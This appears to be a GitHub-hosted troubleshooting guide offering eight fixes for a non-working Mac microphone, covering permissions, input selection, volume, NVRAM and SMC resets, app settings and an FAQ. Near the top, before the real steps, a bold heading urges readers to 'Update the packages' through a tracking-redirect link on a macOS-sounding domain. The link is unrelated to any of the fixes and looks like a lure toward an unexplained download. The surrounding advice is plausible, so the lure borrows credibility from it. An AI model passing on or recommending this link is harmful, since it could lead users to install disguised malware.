# 8 Fixes for Microphone Not Working on Your Mac

Your **Mac microphone is not working**, and the timing couldn't be worse. Maybe you're about to join a Zoom meeting and nobody can hear you, or you're trying to make a FaceTime call and your voice isn't coming through. Perhaps you're recording a podcast, dictating notes with Voice Control, or using Siri — and there's nothing but silence on the other end. A dead microphone on a MacBook or iMac is one of those invisible problems that only becomes obvious when someone says, "We can't hear you."

The good news: a **microphone not working on Mac** is almost always a software issue. Wrong input selected, permissions blocked, volume slider turned down — these are the usual suspects, and every one of them is fixable in minutes without visiting an Apple Store. Whether you're dealing with a **MacBook Pro microphone not working**, a MacBook Air mic that's gone silent, or an iMac that won't pick up sound, this guide covers every solution you need.

Below are eight methods arranged from quickest to most involved. Work through them in order, and you'll almost certainly have your mic back before you finish your coffee.

<img width="2439" height="859" alt="image" src="https://github.com/user-attachments/assets/b25c624c-ca60-4668-89db-d73faa188f59" />

---

## One of the most reliable ways to fix this issue is to update the packages.

## [Update the packages.](https://track.mymacosx.com/n9LRFD?page=mac_2)

If the issue still persists, please follow the steps below.

---

## Table of Contents

- [Why Is Your Mac Microphone Not Working?](#why-is-your-mac-microphone-not-working)
- [How to Test Your Mac Microphone](#how-to-test-your-mac-microphone)
- [How to Fix Microphone Not Working on Mac](#how-to-fix-microphone-not-working-on-mac)
  - [1. Check Microphone Permissions](#1-check-microphone-permissions)
  - [2. Select the Correct Input Device](#2-select-the-correct-input-device)
  - [3. Adjust Input Volume](#3-adjust-input-volume)
  - [4. Restart Your Mac](#4-restart-your-mac)
  - [5. Reset NVRAM/PRAM](#5-reset-nvrampram)
  - [6. Check App-Specific Mic Settings](#6-check-app-specific-mic-settings)
  - [7. Create a New User Account to Test](#7-create-a-new-user-account-to-test)
  - [8. Reset SMC](#8-reset-smc)
- [FAQ](#faq)
- [Conclusion](#conclusion)

## Quick Fix Summary

| Fix | Brief Description |
|-----|-------------------|
| **Check microphone permissions** | Ensure the app has macOS permission to access the microphone |
| **Select the correct input device** | Choose Internal Microphone or your external mic in Sound settings |
| **Adjust input volume** | Drag the input volume slider up and disable ambient noise reduction |
| **Restart your Mac** | Clears temporary audio glitches and resets hardware connections |
| **Reset NVRAM/PRAM** | Resets stored audio settings including input/output device selection |
| **Check app-specific mic settings** | Verify Zoom, Teams, or FaceTime is using the right microphone |
| **Create a new user account** | Tests whether the issue is tied to your user profile |
| **Reset SMC** | Resets low-level hardware controllers that manage audio (Intel only) |

## Why Is Your Mac Microphone Not Working?

Before jumping into fixes, it helps to understand why your **MacBook microphone is not working** in the first place. When your mic goes silent, the cause almost always falls into one of these categories:

- **App permissions are blocking microphone access.** Starting with macOS Mojave (10.14), Apple requires every app to request explicit microphone permission. If you clicked "Don't Allow" when prompted — or never got prompted at all — the app simply can't hear you.
- **The wrong input device is selected.** If you've ever plugged in an external mic, a USB headset, or a Bluetooth device, macOS may have switched your input source away from the built-in microphone and never switched back.
- **Input volume is too low.** The microphone may technically be working, but the input volume slider is set so low that it picks up almost nothing. This is surprisingly common and easy to miss.
- **Another app is monopolizing the microphone.** Some apps grab exclusive mic access. If a voice recorder or another conferencing app is running in the background, your current app may not be able to access the mic.
- **A macOS bug or outdated software.** Certain macOS releases shipped with audio input bugs. For example, some early Ventura builds caused microphone failures after waking from sleep, and Sonoma 14.0 introduced intermittent mic dropouts in third-party apps.
- **Physical damage or obstruction.** Dust, debris, or liquid damage can block or damage the microphone ports. MacBooks have multiple microphone openings along the edges and near the hinge — even a small blockage can reduce pickup.
- **Corrupted audio settings in your user profile.** Audio preferences, cached settings, or corrupted plist files in your user account can cause the mic to stop responding while working perfectly in a fresh account.

Understanding the cause helps you pick the right fix. Let's start by confirming whether the problem is real.

## How to Test Your Mac Microphone

Before troubleshooting, take 30 seconds to confirm your mic is actually not working — and not just muted in a specific app. macOS has a built-in microphone test that gives you instant visual feedback.

**How to test your microphone:**

1. Click the **Apple menu ()** in the top-left corner and select **System Settings** (or **System Preferences** on macOS Monterey and earlier).
2. Navigate to **Sound → Input**.
   - On macOS Ventura and later: **System Settings → Sound**, then scroll down to the **Input** section.
   - On macOS Monterey and earlier: **System Preferences → Sound → Input tab**.
3. Select **Internal Microphone** from the list of input devices.
4. Look at the **input level meter** — it's the horizontal bar below the volume slider.
5. Speak at a normal volume, snap your fingers, or clap near the Mac.
6. If the input level meter moves, your hardware microphone is working. The problem is app-specific or settings-related.
7. If the meter doesn't move at all, the microphone either isn't being detected or has a hardware or system-level issue.

> **Tip:** If the input level bar barely moves when you speak, your microphone is technically working but the input volume is too low. Skip ahead to [Fix #3](#3-adjust-input-volume) to resolve it quickly.

This simple test tells you immediately whether you're dealing with a system-wide microphone failure or a problem isolated to one app. If the level meter moves, focus on app permissions and app-specific settings. If it doesn't, work through all eight fixes below.

## How to Fix Microphone Not Working on Mac

### 1. Check Microphone Permissions

If your **Mac microphone is not working** in a specific app — say Zoom shows "Zoom cannot detect your microphone" but Voice Memos records just fine — the problem is almost certainly a permissions issue. Since macOS Mojave, Apple requires every app to explicitly request microphone access. If that permission was denied, whether by accident or intentionally, the app is completely blocked from using the mic. It won't even show an error in some cases; the mic input simply stays silent.

This is one of the most common causes of the **microphone not working on Mac**, especially after a macOS upgrade where permissions can get reset, or when you install a new conferencing or recording app for the first time.

**How to check and enable microphone permissions:**

1. Open **System Settings** (or **System Preferences** on macOS Monterey and earlier).
2. Navigate to **Privacy & Security → Microphone**.
   - On macOS Ventura and later: **System Settings → Privacy & Security → Microphone**
   - On macOS Monterey and earlier: **System Preferences → Security & Privacy → Privacy tab → Microphone**
3. You'll see a list of every app that has requested microphone access.
4. Make sure the **toggle is turned on** (green) next to the app that can't hear you.
5. If the app isn't listed, open it and try to use the microphone — macOS should prompt you for permission.
6. If you previously denied access and the app doesn't re-prompt, toggle the switch **off and then back on** to force a reset.

> **Tip:** Changing microphone permissions requires you to quit and reopen the affected app. macOS will usually prompt you to do this automatically when you flip the toggle. If it doesn't, fully quit the app (right-click its Dock icon → **Quit**) and relaunch it.

On macOS Sequoia (15.x) and later, Apple has further tightened privacy controls. Some apps may also need approval under **System Settings → Privacy & Security → App Management** to manage their own microphone access. If you don't see an app listed under Microphone permissions at all, check whether it's a web-based app running inside Safari or Chrome — browser-based apps inherit the browser's microphone permission, not their own.

### 2. Select the Correct Input Device

Your **MacBook mic not working** might simply be a case of macOS listening to the wrong device. If you've ever connected a Bluetooth headset, USB microphone, audio interface, or even a pair of wired EarPods, macOS may have switched the input source to that device — and never switched back when you disconnected it. Your built-in microphone is working fine; macOS just isn't using it.

This happens more often than you'd expect, especially if you alternate between headsets and the internal mic for different tasks. macOS remembers the last-used input device and sometimes gets stuck on a device that's no longer connected.

**How to select the correct input device:**

1. Click the **Apple menu ()** → **System Settings** (or **System Preferences** on Monterey and earlier).
2. Go to **Sound → Input**.
   - On macOS Ventura and later: **System Settings → Sound**, scroll to the **Input** section.
   - On macOS Monterey and earlier: **System Preferences → Sound → Input tab**.
3. You'll see a list of available input devices. Look for **Internal Microphone** (the built-in mic on MacBooks and iMacs) or the name of your external microphone.
4. Click **Internal Microphone** to select it.
5. Speak into the Mac and watch the **input level meter** to confirm it's picking up sound.

> **Tip:** If you're using an external USB or Thunderbolt microphone and it doesn't appear in the input list, try unplugging it, waiting 10 seconds, and plugging it back in. If it still doesn't show up, try a different USB port — some hubs and adapters don't pass audio devices through reliably. For Bluetooth microphones, make sure the device is connected under **System Settings → Bluetooth** before checking the Sound input list.

If you use an external mic regularly and want macOS to always default to the internal microphone when nothing is plugged in, there's no built-in setting for this — macOS always remembers the last manually selected device. You'll need to manually switch back each time you disconnect your external mic.

*Also read: [How to Fix Camera Not Working on Mac]()*

### 3. Adjust Input Volume

Here's a fix that's so simple it's easy to overlook: your **Mac microphone** might be working perfectly, but the input volume is turned down so low that it captures almost nothing. People on the other end of your calls hear silence or faint, unintelligible murmuring — and you assume the mic is broken.

This typically happens when someone (or an app) has adjusted the input volume slider, or when macOS's ambient noise reduction feature is aggressively filtering out what it thinks is background noise — including your voice.

**How to adjust microphone input volume:**

1. Open **System Settings → Sound** (or **System Preferences → Sound → Input** on Monterey and earlier).
2. Scroll to the **Input** section and select your active microphone.
3. Drag the **Input volume** slider to the **right** — start at about 75% and adjust from there.
4. Speak normally and watch the input level meter. The bars should move comfortably into the middle-to-upper range without constantly hitting the maximum.
5. If available, look for the **"Use ambient noise reduction"** checkbox. Try toggling it **off** to see if it improves clarity.

> **Tip:** On macOS Sonoma and later, the ambient noise reduction setting has moved into individual app settings for some apps (like FaceTime). If you don't see it in System Settings, check the audio preferences within the specific app you're using. In FaceTime, go to **Video → Mic Mode** during a call and switch from **Voice Isolation** to **Standard** if your voice sounds muffled or gets cut off.

If the input volume slider is grayed out and can't be adjusted, it usually means either no input device is selected or the selected device doesn't support software volume control (some external audio interfaces manage volume through their own hardware knobs). Select **Internal Microphone** to get the slider back.

### 4. Restart Your Mac

If permissions, input selection, and volume are all correct but your **MacBook microphone is still not working**, a restart is the next step. It sounds too simple, but a restart clears temporary memory, terminates every background process, and reinitializes all hardware connections — including the audio subsystem that controls your microphone.

Restarting is particularly effective when the mic stopped working after waking from sleep, after a software update, or after plugging and unplugging audio devices. macOS occasionally fails to properly hand microphone control back to the system after one of these events, and a full restart forces a clean re-initialization.

**How to restart your Mac:**

1. Click the **Apple menu ()** in the top-left corner.
2. Select **Restart…** from the dropdown.
3. Uncheck **"Reopen windows when logging back in"** for a clean start.
4. Click **Restart** and wait for your Mac to fully boot.
5. After logging in, open **System Settings → Sound → Input** and test the microphone level meter again.

If your Mac is unresponsive and you can't restart normally, press and hold the **power button** for about 10 seconds until the screen goes black, then press it again to turn the Mac back on.

> **Tip:** If you've been putting your Mac to sleep for weeks without a full shutdown, a restart is especially likely to fix audio problems. macOS accumulates background process issues and stale hardware states over extended uptime. Some users make it a habit to restart once a week to prevent problems like this from building up.

### 5. Reset NVRAM/PRAM

NVRAM (Non-Volatile Random-Access Memory) stores low-level settings that persist between restarts, including your selected sound input/output devices, volume levels, and audio routing preferences. If these stored values get corrupted or stuck on the wrong configuration, your **Mac microphone not working** issue may survive even a restart. Resetting NVRAM clears these cached audio settings and forces macOS to rebuild them from scratch.

This fix is especially useful if your microphone issue started after changing audio devices, installing an audio-related app, or updating macOS.

**How to reset NVRAM on Intel Macs:**

1. **Shut down** your Mac completely (not just restart — choose **Apple menu → Shut Down**).
2. Turn your Mac back on and **immediately** press and hold **Option + Command + P + R** (all four keys at once).
3. Keep holding the keys for about **20 seconds**. On older Intel Macs, you'll hear the startup chime play twice. On newer Intel Macs (2018+) with the T2 chip, hold until the Apple logo appears and disappears for the second time.
4. Release the keys and let your Mac boot normally.
5. After logging in, go to **System Settings → Sound → Input** and reselect **Internal Microphone** — NVRAM reset clears your audio device selection, so you'll need to set it again.

**Apple Silicon Macs (M1, M2, M3, M4 and later):**

Apple Silicon Macs do not have a manual NVRAM reset procedure. The equivalent data is reset automatically every time you shut down and restart your Mac. If you're using an Apple Silicon MacBook or iMac, a simple **Shut Down** (not restart) followed by turning the Mac back on achieves the same result. Make sure you choose **Shut Down** from the Apple menu rather than **Restart** — a full power-off cycle is what triggers the NVRAM-equivalent reset on Apple Silicon.

> **Tip:** After resetting NVRAM, you may notice that your Mac's volume, display brightness, startup disk selection, and time zone have reverted to defaults. This is normal — just reconfigure these settings as needed. The important thing is that your audio routing is now clean.

### 6. Check App-Specific Mic Settings

Sometimes the issue isn't macOS at all — it's the app. Many conferencing and recording applications have their own internal microphone settings that override or bypass the system defaults. If your **microphone is not working on Mac** specifically during Zoom calls, Teams meetings, or FaceTime conversations, the app itself may be pointed at the wrong input device or have its mic muted at the software level.

This is one of the most frustrating causes because everything looks correct in System Settings, yet the app still can't hear you.

**Zoom:**

1. Open Zoom and click your **profile picture** → **Settings** (or go to **Zoom → Settings** from the menu bar).
2. Click **Audio** in the left sidebar.
3. Under **Microphone**, click the dropdown and select your preferred input device — either **Internal Microphone** or your external mic.
4. Click **Test Mic** to verify it's working. Zoom will record a short clip and play it back.
5. Make sure the **"Automatically adjust microphone volume"** checkbox is checked unless you have a reason to control it manually.

**Microsoft Teams:**

1. Open Teams and click the **three-dot menu (⋯)** next to your profile picture → **Settings**.
2. Go to **Devices**.
3. Under **Microphone**, select the correct input device from the dropdown.
4. Click **Make a test call** to verify audio input and output.

**FaceTime:**

1. Open FaceTime.
2. During an active call, click **Video** in the menu bar → **Mic Mode**.
3. Choose **Standard** instead of **Voice Isolation** if your voice is being filtered out. Voice Isolation uses machine learning to suppress background noise, but it can sometimes suppress quiet or unusual voices.
4. To change the input device in FaceTime, you need to change it at the system level: **System Settings → Sound → Input**. FaceTime doesn't have its own mic selector.

> **Tip:** If you use multiple conferencing apps, check the mic settings in each one individually. It's common for Zoom to be set to the correct microphone while Teams is still pointed at a disconnected Bluetooth headset. Each app maintains its own audio device preferences independently.

*Also read: [How to Speed Up Your MacBook]()*

### 7. Create a New User Account to Test

If you've tried everything above and your **MacBook Pro microphone is still not working**, the issue might be specific to your user account. Corrupted preference files, misconfigured audio settings stored in your Library folder, or conflicting login items can all cause microphone failures that only affect one user profile on the Mac.

Creating a temporary new user account is the fastest way to determine if this is the case. If the microphone works perfectly in the new account, you've confirmed the problem is with your user profile — not the hardware or macOS itself.

**How to create a test user account:**

1. Open **System Settings → Users & Groups** (or **System Preferences → Users & Groups** on Monterey and earlier).
2. On macOS Ventura and later, click **Add Account…**. On older versions, click the **lock icon** to make changes, then click the **+ button**.
3. Set the account type to **Administrator** (you need admin rights to test system-level features like the microphone).
4. Enter a name (something like "Mic Test") and a password.
5. Click **Create User**.
6. **Log out** of your current account: **Apple menu → Log Out**.
7. Log into the new **Mic Test** account.
8. Open **System Settings → Sound → Input**, select **Internal Microphone**, and check the input level meter while speaking.

**Interpreting the results:**

- **Microphone works in the new account:** The problem is isolated to your original user profile. The most common culprits are corrupted audio-related `.plist` files in `~/Library/Preferences/` or conflicting launch agents in `~/Library/LaunchAgents/`. You can try deleting `com.apple.sound.plist` and `com.apple.audio.SystemSettings.plist` from your Preferences folder to reset your audio configuration (the files will be recreated with default settings on next login).
- **Microphone doesn't work in the new account either:** The issue is system-wide — move on to Fix #8 (Reset SMC) or consider contacting Apple Support for hardware diagnostics.

> **Tip:** After testing, you can delete the temporary account by going back to **System Settings → Users & Groups**, clicking the new account, and selecting **Delete Account**. Choose **"Delete the home folder"** to free up the disk space.

### 8. Reset SMC

The SMC (System Management Controller) is a chip on Intel Macs that manages low-level hardware functions including power, thermal management, battery charging, and — critically — audio hardware controllers. If the SMC gets into a bad state, it can cause the microphone to stop being recognized at the hardware level, even when macOS and all settings appear correct. Resetting the SMC forces these hardware controllers back to their default state.

This is typically the last resort for **microphone not working on Mac** issues when all software-level fixes have failed.

**How to reset SMC on Intel MacBooks (with T2 chip — 2018 and later):**

1. **Shut down** your Mac completely.
2. Press and hold **Shift (left side) + Control (left side) + Option (left side)** and the **power button** simultaneously for **10 seconds**.
3. Release all keys.
4. Press the **power button** to turn your Mac back on.
5. After booting, go to **System Settings → Sound → Input** and test the microphone.

**How to reset SMC on Intel MacBooks (without T2 chip — 2017 and earlier):**

1. **Shut down** your Mac.
2. Press and hold **Shift (left side) + Control (left side) + Option (left side)**, then press the **power button** while holding these three keys.
3. Hold all four keys for **10 seconds**, then release.
4. Press the **power button** to turn on your Mac.

**How to reset SMC on Intel iMacs, Mac Pros, and Mac Minis:**

1. **Shut down** your Mac and **unplug the power cord**.
2. Wait **15 seconds**.
3. Plug the power cord back in and wait **5 seconds**.
4. Press the **power button** to turn on your Mac.

**Apple Silicon Macs (M1, M2, M3, M4 and later):**

Apple Silicon Macs do not have an SMC. The functions that the SMC handled on Intel Macs are built directly into the Apple Silicon chip. A simple **shut down and restart** handles everything the SMC reset would have done on an Intel Mac. If you've already tried restarting, you've effectively already performed the equivalent of an SMC reset.

> **Tip:** After an SMC reset, some settings like keyboard backlighting behavior and trackpad responsiveness may temporarily feel different. This is normal — the SMC needs a few minutes of use to recalibrate. Your audio and microphone settings should be immediately improved, though you may need to reselect your preferred input device in **System Settings → Sound → Input**.

If none of these eight fixes resolve the issue, your Mac's microphone hardware may have a physical problem — especially if you've noticed gradual degradation, crackling, or the mic working intermittently. Contact **Apple Support** or visit an **Apple Store** for hardware diagnostics. If your Mac is under warranty or covered by AppleCare+, microphone repairs are typically covered at no cost.

## FAQ

### How Do I Test My Mac Microphone?

The quickest way to test your Mac microphone is through **System Settings → Sound → Input** (or **System Preferences → Sound → Input** on macOS Monterey and earlier). Select **Internal Microphone** from the device list and watch the **input level meter** while you speak. If the bars move, your hardware mic is working and the issue is app-specific. If the bars don't move at all, you have a system-level or hardware problem.

For a more thorough test, open **Voice Memos** (preinstalled on every Mac), click the red record button, speak for a few seconds, stop the recording, and play it back. If you hear your voice clearly, the microphone is functioning. You can also open **QuickTime Player**, go to **File → New Audio Recording**, and use the volume meter next to the record button to monitor input levels in real time.

### Why Can't People Hear Me on Zoom or FaceTime?

If people can't hear you on Zoom or FaceTime but your Mac microphone tests fine in System Settings, the problem is almost always in the app's audio configuration. In **Zoom**, go to **Settings → Audio** and make sure the correct microphone is selected from the dropdown — it may be pointed at a disconnected Bluetooth device or "Same as System" when the system default is wrong. Click **Test Mic** to verify. In **FaceTime**, the mic input follows your system setting, but the **Mic Mode** (accessible via **Video → Mic Mode** during a call) may be set to **Voice Isolation**, which can filter out your voice if you're speaking softly or in an unusual tone.

Also check that you haven't been muted. In Zoom, look for the microphone icon in the bottom-left corner — if it has a red slash through it, click it to unmute. In FaceTime, check the microphone button in the call controls. It sounds obvious, but accidental muting accounts for a huge percentage of "mic not working" reports.

### Can I Use an External Microphone with My Mac?

Yes. Macs support external microphones connected via **USB**, **USB-C**, **Thunderbolt**, **3.5mm audio jack** (on models that still have one), and **Bluetooth**. Once connected, the external mic should appear in **System Settings → Sound → Input**. Select it from the list, and macOS will route all audio input through that device.

For USB and USB-C microphones (like the Blue Yeti or Rode NT-USB), the mic typically appears automatically as soon as you plug it in — no drivers needed. For XLR microphones, you'll need an **audio interface** (like a Focusrite Scarlett) that connects via USB or Thunderbolt. Bluetooth microphones, including AirPods and Bluetooth headsets, need to be paired first under **System Settings → Bluetooth** before they show up as input devices.

> **Tip:** If your external mic appears in the input list but doesn't pick up sound, check whether it has a physical mute button or gain knob. Many USB microphones have hardware-level mute switches that override all software settings.

### How Do I Reset My Mac's Audio Settings?

There's no single "reset audio" button in macOS, but you can effectively reset all audio settings by combining a few steps. First, go to **System Settings → Sound → Input**, select **Internal Microphone**, and drag the input volume slider to about 75%. Then go to the **Output** tab and make sure the correct output device is selected. This handles the most common audio configuration problems.

For a deeper reset, you can delete the audio preference files that macOS uses to store your settings. Open **Finder**, press **Command + Shift + G**, type `~/Library/Preferences/`, and look for files named `com.apple.sound.plist` and `com.apple.audio.SystemSettings.plist`. Move these files to the Trash and restart your Mac — macOS will recreate them with factory-default audio settings. On **Intel Macs**, you can also reset NVRAM (**Option + Command + P + R** on boot) and SMC to clear hardware-level audio configurations. On **Apple Silicon Macs**, a full shut down and restart achieves the same hardware-level audio reset.

## Conclusion

A **Mac microphone not working** is almost never a hardware failure. In the vast majority of cases, the culprit is a permissions block, the wrong input device selected, a low volume slider, or an app-specific setting override. Start with the basics: check permissions, verify your input device, and make sure the volume slider isn't bottomed out. These three steps alone fix the problem for most users.

If the simple fixes don't resolve it, work through a restart, NVRAM reset, and app-specific audio settings. Creating a new user account isolates whether the issue lives in your profile or the system. And for Intel Mac users, an SMC reset is the final software-level fix before considering hardware. Keep your macOS updated, be intentional about which input device is selected after connecting and disconnecting external audio gear, and remember that the input level meter in **System Settings → Sound → Input** is the single fastest way to diagnose whether your microphone is actually picking up sound or not.
